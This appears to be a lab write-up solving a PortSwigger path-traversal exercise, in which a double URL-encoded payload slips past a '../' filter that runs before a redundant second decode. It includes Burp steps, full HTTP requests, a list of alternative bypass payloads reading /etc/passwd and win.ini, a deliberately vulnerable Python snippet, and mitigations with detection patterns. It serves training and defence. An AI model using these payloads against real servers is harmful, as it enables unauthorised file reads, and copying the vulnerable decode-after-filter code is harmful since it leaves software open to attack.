# 📘 PortSwigger Lab: File Path Traversal, Traversal Sequences Stripped with Superfluous URL-decode

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode  
> 🎯 Topic: Path Traversal — bypassing input filtering with double URL-encoding  
> 🧪 Difficulty: Practitioner  
> ✅ Status: Solved  

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [📁 What Is Path Traversal](#path-traversal)
- [🔁 What "Superfluous URL-decode" Means](#superfluous)
- [🔬 How the Working Payload Is Built](#payload-building)
- [🗂 How the Application Loads Images](#images)
- [❌ Vulnerable Filtering Logic](#vulnerable-flow)
- [🔍 Step 1 — Find the Image Request](#step1)
- [🔍 Step 2 — Send the Request to Repeater](#step2)
- [🔍 Step 3 — Test Standard Traversal](#step3)
- [🔍 Step 4 — Test Single URL-Encoding](#step4)
- [🔍 Step 5 — Use Double URL-Encoding](#step5)
- [🔍 Step 6 — Read `/etc/passwd`](#step6)
- [📨 Example Original Request](#original-request)
- [📨 Example Modified Request](#modified-request)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧭 How `%252f` Becomes `/`](#transformation)
- [🐧 Why `/etc/passwd` Is Used](#passwd)
- [🧠 Pentester Mindset](#pentester)
- [🧪 Additional Tests](#additional-tests)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

Exploit a **File Path Traversal** vulnerability in the product image display mechanism and retrieve the contents of:

```text
/etc/passwd
```

The application blocks input containing path traversal sequences:

```text
../
```

However, it then performs a **URL-decode** of the input *before using it*.

To bypass the filter, place the following value in the:

```text
filename
```

parameter:

```text
..%252f..%252f..%252fetc/passwd
```

The value contains no literal `../` when the filter inspects it, but after a second URL-decode pass the server is left with:

```text
../../../etc/passwd
```

---

<a id="theory"></a>

## 🧠 Short Theory

**Path Traversal** is a vulnerability that allows user input to influence the path of a file read by the server.

The application expects a normal image name:

```text
filename=58.jpg
```

The server may construct a path such as:

```text
/var/www/images/58.jpg
```

Without proper validation, an attacker may try:

```text
../../../etc/passwd
```

The sequence:

```text
../
```

moves one directory upward.

In this lab, the developer attempted to prevent the attack by blocking any input that contains `../`. The weakness is that the value is **URL-decoded again after the filter runs**.

Every web framework already decodes URL-encoded characters when it parses the query string. Here the application performs one *additional* decode afterwards. Because of this second decode, a doubly-encoded slash:

```text
%252f
```

passes the filter as harmless text, but is converted into a real slash:

```text
/
```

only at the final step — after the filter has already approved the value.

---

<a id="idea"></a>

## 🧩 Core Idea

A standard payload:

```text
../../../etc/passwd
```

is blocked immediately, because the filter sees the literal sequence `../`.

A singly-encoded payload:

```text
..%2f..%2f..%2fetc/passwd
```

is also blocked. The web framework decodes `%2f` to `/` while parsing the request, so by the time the application's filter runs, the value is again:

```text
../../../etc/passwd
```

The filter sees `../` and rejects it.

The working approach uses **double encoding**:

```text
..%252f..%252f..%252fetc/passwd
```

Processing flow:

```text
..%252f..%252f..%252fetc/passwd
                ↓ decode #1 (web framework)
..%2f..%2f..%2fetc/passwd          ← filter sees no "../", passes
                ↓ decode #2 (application, superfluous)
../../../etc/passwd                 ← traversal sequence is created
                ↓ path resolution
/etc/passwd                          ← file is read
```

The critical insight is the **order of operations**: the filter runs between the two decoding steps, not after all decoding is complete.

---

<a id="path-traversal"></a>

## 📁 What Is Path Traversal

Path Traversal is also known as:

```text
Directory Traversal
```

or:

```text
dot-dot-slash attack
```

The primary sequence on Linux and Unix is:

```text
../
```

A Windows application may also accept:

```text
..\
```

The purpose of `../` is:

```text
move to the parent directory
```

Example starting directory:

```text
/var/www/images/
```

After one traversal:

```text
/var/www/
```

After two:

```text
/var/
```

After three:

```text
/
```

The attacker can then reference:

```text
/etc/passwd
```

The path:

```text
/var/www/images/../../../etc/passwd
```

normalizes to:

```text
/etc/passwd
```

---

<a id="superfluous"></a>

## 🔁 What "Superfluous URL-decode" Means

The word:

```text
superfluous
```

means *unnecessary* or *redundant*.

In a normal request, a URL-encoded query parameter is decoded exactly once — by the web framework or server when the request is parsed:

```text
filename=58%2ejpg  →  58.jpg
```

In this lab, the application decodes the value **a second time**, manually, before constructing the file path. This second decode is superfluous: for legitimate values such as `58.jpg` it changes nothing, and the developer probably added it for "safety".

A simplified vulnerable implementation may look like:

```python
filename = request.args.get("filename")      # already decoded once by the framework
if "../" in filename or "..\\" in filename:
    return "Access denied"
filename = urllib.parse.unquote(filename)     # superfluous second decode
path = "/var/www/images/" + filename
return open(path, "rb").read()
```

The second `unquote()` call is the root cause. It converts encoded characters into real ones *after* the security check, so any character that was encoded twice survives the filter and becomes dangerous only later.

---

<a id="payload-building"></a>

## 🔬 How the Working Payload Is Built

The ordinary slash character has a URL-encoded form:

```text
%2f
```

If the value is decoded twice, the slash must be encoded twice:

```text
%252f
```

Decoding steps:

```text
%252f
  ↓ decode #1
%2f
  ↓ decode #2
/
```

One traversal segment is built as:

```text
..%252f
```

At filter time this looks like:

```text
..%2f
```

which contains **no** `../` sequence, so the filter approves it. After the application's decode it becomes:

```text
../
```

Three segments are needed to move three directories upward:

```text
..%252f..%252f..%252f
```

After the final decode:

```text
../../../
```

Appending the target file creates the working payload:

```text
..%252f..%252f..%252fetc/passwd
```

which becomes:

```text
../../../etc/passwd
```

---

<a id="images"></a>

## 🗂 How the Application Loads Images

The lab contains a vulnerability in the product image display feature.

When a user opens a product page, the browser sends a separate request for the product image.

Example:

```http
GET /image?filename=58.jpg HTTP/2
Host: LAB-ID.web-security-academy.net
```

The parameter:

```text
filename
```

tells the server which file to read.

Assume the application uses:

```text
/var/www/images/
```

For a normal value:

```text
58.jpg
```

the final path is:

```text
/var/www/images/58.jpg
```

For the malicious value after double decoding, the final path becomes:

```text
/var/www/images/../../../etc/passwd
```

The file system normalizes this to:

```text
/etc/passwd
```

---

<a id="vulnerable-flow"></a>

## ❌ Vulnerable Filtering Logic

A simplified vulnerable implementation may look like:

```python
filename = request.args.get("filename")
if "../" in filename:
    return "Access denied"

filename = urllib.parse.unquote(filename)   # decoded AGAIN after the check
path = "/var/www/images/" + filename

return open(path, "rb").read()
```

The developer assumes that rejecting any value containing:

```text
../
```

prevents access outside the image directory.

However, this input:

```text
..%252f..%252f..%252fetc/passwd
```

contains no `../` at the moment the filter runs, so it passes. The second decode then produces:

```text
../../../etc/passwd
```

The application concatenates it with the base directory:

```text
/var/www/images/../../../etc/passwd
```

and reads the system file.

Vulnerable flow:

```text
User-controlled filename
        ↓
Web framework decodes once (%252f → %2f)
        ↓
Filter checks for "../" — not found
        ↓
Application decodes again (%2f → /)
        ↓
Concatenate with image directory
        ↓
File-system normalization
        ↓
Read /etc/passwd
```

---

<a id="step1"></a>

## 🔍 Step 1 — Find the Image Request

1. Open the lab.
2. Visit any product page.
3. Start Burp Suite.
4. Open:

```text
Proxy → HTTP history
```

5. Find the request that retrieves the product image.

It normally looks similar to:

```http
GET /image?filename=58.jpg HTTP/2
Host: LAB-ID.web-security-academy.net
```

The main test input is:

```text
filename=58.jpg
```

---

<a id="step2"></a>

## 🔍 Step 2 — Send the Request to Repeater

Right-click the request and select:

```text
Send to Repeater
```

Open the:

```text
Repeater
```

tab.

Burp Repeater allows you to:

- modify the `filename` value;
- resend the request;
- compare response status codes;
- compare response lengths;
- inspect the response body;
- verify whether a different file was returned.

---

<a id="step3"></a>

## 🔍 Step 3 — Test Standard Traversal

First, replace the image name:

```text
58.jpg
```

with the standard payload:

```text
../../../etc/passwd
```

Request:

```http
GET /image?filename=../../../etc/passwd HTTP/2
Host: LAB-ID.web-security-academy.net
```

The application blocks the value, so the standard version does not retrieve the target file.

This confirms that a filter for `../` exists, but it does not prove that the implementation is secure.

The next pentesting questions are:

```text
Is the input URL-decoded after the filter?
```

```text
How many decoding passes does the value go through?
```

---

<a id="step4"></a>

## 🔍 Step 4 — Test Single URL-Encoding

Replace the `filename` value with a singly-encoded payload:

```text
..%2f..%2f..%2fetc/passwd
```

Request:

```http
GET /image?filename=..%2f..%2f..%2fetc/passwd HTTP/2
Host: LAB-ID.web-security-academy.net
```

This attempt is also blocked. Reason: the web framework decodes `%2f` to `/` while parsing the query string, so the application's filter again receives:

```text
../../../etc/passwd
```

and rejects it.

The result is still useful information: it proves that the filter sees the value **after one decoding pass**. Therefore the bypass must survive that first pass and only become dangerous after a *second* decode — i.e. double encoding is required.

---

<a id="step5"></a>

## 🔍 Step 5 — Use Double URL-Encoding

Replace the `filename` value with:

```text
..%252f..%252f..%252fetc/passwd
```

Modified request:

```http
GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/2
Host: LAB-ID.web-security-academy.net
```

Click:

```text
Send
```

Transformation logic:

```text
..%252f..%252f..%252fetc/passwd
        ↓ decode #1 (framework): %252f → %2f
..%2f..%2f..%2fetc/passwd          ← filter: no "../", passes
        ↓ decode #2 (application): %2f → /
../../../etc/passwd
```

---

<a id="step6"></a>

## 🔍 Step 6 — Read `/etc/passwd`

The HTTP response now contains text from the system file instead of image data.

Typical lines include:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

This confirms that the server read:

```text
/etc/passwd
```

The lab is then marked:

```text
Solved
```

---

<a id="original-request"></a>

## 📨 Example Original Request

```http
GET /image?filename=58.jpg HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION-VALUE
User-Agent: Mozilla/5.0
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
```

The client controls:

```text
58.jpg
```

---

<a id="modified-request"></a>

## 📨 Example Modified Request

```http
GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION-VALUE
User-Agent: Mozilla/5.0
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
```

Critical payload:

```text
..%252f..%252f..%252fetc/passwd
```

Important note for Burp Repeater: type the value exactly as shown. The `%` characters must be literal — Burp must **not** re-encode them (otherwise `%252f` would be sent as `%25252f` and the bypass would fail).

---

<a id="response"></a>

## 📥 Example Result

The response may look similar to:

```http
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: ...
```

Response body:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
```

The exact contents depend on the lab environment.

The important proof is:

```text
the response contains data from /etc/passwd
```

---

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain

```text
1. Open the PortSwigger lab
2. Visit a product page
3. Find the /image?filename=... request in Burp HTTP history
4. Send the request to Repeater
5. Confirm that standard ../../../etc/passwd is blocked
6. Confirm that singly-encoded ..%2f... is also blocked
7. Infer that the value is URL-decoded again after the filter
8. Double-encode the slashes: %252f
9. Submit ..%252f..%252f..%252fetc/passwd
10. Send the modified request
11. Receive the contents of /etc/passwd
12. Confirm that the lab is marked Solved
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

The vulnerability resulted from several combined issues.

### 1. The User Controls the File Name

The:

```text
filename
```

parameter is supplied by the client.

### 2. The Value Is Used to Build a File Path

The server appends the user-controlled value to the image directory.

### 3. The Defense Relies on Blocking `../`

The application rejects values containing the literal sequence `../`.

### 4. The Value Is Decoded More Than Once

The framework decodes once when parsing the request, and the application decodes again before using the value. This second decode is superfluous.

### 5. The Filter Runs Between the Decoding Passes

The filter checks the value after the first decode but before the second, so doubly-encoded characters are invisible to it at the moment of the check.

### 6. The Final Path Is Not Validated

The application does not verify that the normalized path remains inside the image directory.

### 7. The Application Process Can Read the File

The web application has permission to read `/etc/passwd`, so its contents are returned to the client.

---

<a id="transformation"></a>

## 🧭 How `%252f` Becomes `/`

A slash encoded once:

```text
%2f
```

A slash encoded twice:

```text
%252f
```

Decoding chain:

```text
%252f
  ↓ first URL-decode
%2f
  ↓ second URL-decode
/
```

For one traversal segment:

```text
..%252f
  ↓ first URL-decode
..%2f       ← filter sees this, no "../" inside, passes
  ↓ second URL-decode
../
```

For the complete payload:

```text
..%252f..%252f..%252fetc/passwd
```

the transformation is:

```text
..%252f  →  ..%2f  →  ../
..%252f  →  ..%2f  →  ../
..%252f  →  ..%2f  →  ../
```

Result:

```text
../../../etc/passwd
```

Then:

```text
/var/www/images/../../../etc/passwd
```

normalizes to:

```text
/etc/passwd
```

---

<a id="passwd"></a>

## 🐧 Why `/etc/passwd` Is Used

`/etc/passwd` is a standard Linux and Unix system file.

It contains information about local user accounts.

Line format:

```text
username:x:UID:GID:comment:home:shell
```

Example:

```text
root:x:0:0:root:/root:/bin/bash
```

Field meanings:

```text
root        username
x           password is stored elsewhere
0           UID
0           GID
root        account description
/root       home directory
/bin/bash   login shell
```

Important distinction:

```text
/etc/passwd normally does not contain password hashes
```

Modern Linux systems usually store password hashes in:

```text
/etc/shadow
```

which is restricted to privileged processes.

The lab uses `/etc/passwd` as a safe proof of arbitrary file read.

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

When an application accepts a file name, test not only ordinary `../`, but also possible filter bypasses.

Useful questions include:

```text
Is ../ blocked, or is the whole request rejected?
```

```text
Is the input URL-decoded before or after the filter?
```

```text
How many decoding passes does the value go through?
```

```text
Does single URL-encoding work? Does double encoding work?
```

```text
Are absolute paths accepted?
```

```text
Are backslashes accepted?
```

```text
Is the final canonical path validated?
```

Common parameter names:

```text
file
filename
path
document
template
page
image
download
folder
```

General testing process:

```text
1. Find a file-related parameter
2. Identify the normal value
3. Test ../
4. Analyze the filter behavior
5. Try encoding variations: %2f, %252f, %2e%2e%2f, ...
6. Compare status, body, length, and Content-Type
7. Verify the returned content
```

---

<a id="additional-tests"></a>

## 🧪 Additional Tests

Within an authorized lab, the following variants can be compared:

### Standard traversal (blocked)

```text
../../../etc/passwd
```

### Single URL-encoding (blocked — decoded by the framework before the filter)

```text
..%2f..%2f..%2fetc%2fpasswd
```

### Double URL-encoding (working for this lab)

```text
..%252f..%252f..%252fetc/passwd
```

### Fully double-encoded payload

```text
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Encoded dots, plain slashes

```text
%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

### Nested traversal sequences

```text
....//....//....//etc/passwd
```

### Absolute path

```text
/etc/passwd
```

### Windows-style path

```text
..\..\..\windows\win.ini
```

The working value for this specific lab is:

```text
..%252f..%252f..%252fetc/passwd
```

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### Mistake 1. Modifying the Product Page Request

The vulnerability is located in the separate image request:

```http
GET /image?filename=...
```

### Mistake 2. Changing the Wrong Parameter

The target parameter is:

```text
filename
```

### Mistake 3. Continuing to Use Standard `../`

Literal traversal sequences are blocked by the filter.

### Mistake 4. Using Only Single URL-Encoding

The value:

```text
..%2f..%2f..%2fetc/passwd
```

is decoded by the web framework before the filter runs, so it is blocked too.

### Mistake 5. Forgetting That the Framework Decodes Once

Without accounting for the first decode, the number of encoding layers is wrong. Two layers are required here.

### Mistake 6. Using Too Few Traversals

This lab requires three upward transitions:

```text
..%252f..%252f..%252f
```

### Mistake 7. Omitting the Target File

The complete payload is:

```text
..%252f..%252f..%252fetc/passwd
```

### Mistake 8. Letting Burp Re-Encode the Payload

In Repeater, the value must be typed literally. If the tool converts `%252f` into another encoding layer, the bypass fails. Verify the raw request line before sending.

### Mistake 9. Looking Only at the HTTP Status

Successful and unsuccessful requests may both return `200 OK`.

Inspect the response body.

### Mistake 10. Expecting JPEG Data

After exploitation, the server returns text from `/etc/passwd`, not an image.

### Mistake 11. Treating the Filter as a Complete Defense

Blocking one string representation does not replace decoding-order analysis and final-path validation.

---

<a id="defense"></a>

## 🛡 Mitigation

### 1. Do Not Accept File Paths from the User

Use an identifier instead:

```text
image_id=58
```

Resolve it server-side:

```python
allowed_images = {
    "58": "58.jpg",
    "59": "59.jpg",
}
```

### 2. Use an Allowlist

Permit only known file names.

Example:

```python
if filename not in allowed_filenames:
    reject_request()
```

### 3. Decode the Input Only Once, at a Single Defined Point

Do not call `unquote()` again inside the application. If the framework already decoded the query parameter, no further decoding should occur.

### 4. Validate After All Decoding Is Complete

The security check must run on the **final** value that is used to build the path — never before all decoding passes are finished.

### 5. Normalize the Final Path

```python
base = os.path.realpath("/var/www/images")
target = os.path.realpath(os.path.join(base, user_input))
```

### 6. Verify That the Path Remains Inside the Base Directory

```python
if not target.startswith(base + os.sep):
    reject_request()
```

### 7. Use `basename` Only as an Additional Control

```python
filename = os.path.basename(user_input)
```

This may help, but it should not be the only defense.

### 8. Apply Least Privilege

The web application process should have access only to files it actually requires.

### 9. Avoid Detailed File-System Errors

Errors should not reveal:

- absolute paths;
- internal directory structures;
- internal file names;
- stack traces.

### 10. Log Suspicious Values

Examples:

```text
../
..%2f
..%252f
%2e%2e%2f
%252e%252e%252f
....//
..\
```

Logging helps detect attacks, but it does not replace correct validation.

---

<a id="checklist"></a>

## ✅ Checklist

### Reconnaissance

- [ ] Opened a product page
- [ ] Started Burp Proxy
- [ ] Located the image request
- [ ] Identified the `filename` parameter
- [ ] Sent the request to Repeater

### Filter and Decoding Analysis

- [ ] Tested standard `../../../etc/passwd`
- [ ] Confirmed that `../` is blocked
- [ ] Tested single encoding `..%2f...`
- [ ] Confirmed that single encoding is blocked too
- [ ] Deduced that a second URL-decode happens after the filter
- [ ] Built a double-encoded payload

### Exploitation

- [ ] Used `..%252f..%252f..%252fetc/passwd`
- [ ] Sent the modified request
- [ ] Received lines from `/etc/passwd`
- [ ] Confirmed arbitrary file read
- [ ] Confirmed the lab status is Solved

---

<a id="conclusion"></a>

## 🧾 Conclusion

The application attempted to prevent Path Traversal by blocking input that contains:

```text
../
```

However, the value was URL-decoded a second time **after** the filter had already approved it.

The payload:

```text
..%252f..%252f..%252fetc/passwd
```

became:

```text
../../../etc/passwd
```

after the second decoding pass, allowing the request to escape the image directory and retrieve:

```text
/etc/passwd
```

Main lessons:

```text
The order of filtering and decoding is a security-critical detail.
```

```text
The final value must be validated after ALL decoding passes.
```

```text
Input should never be decoded more than once without re-validation.
```

```text
Security should rely on normalization and validation of the final canonical path.
```

```text
The normalized path must remain inside the approved base directory.
```

---

[⬆ Back to top](#top)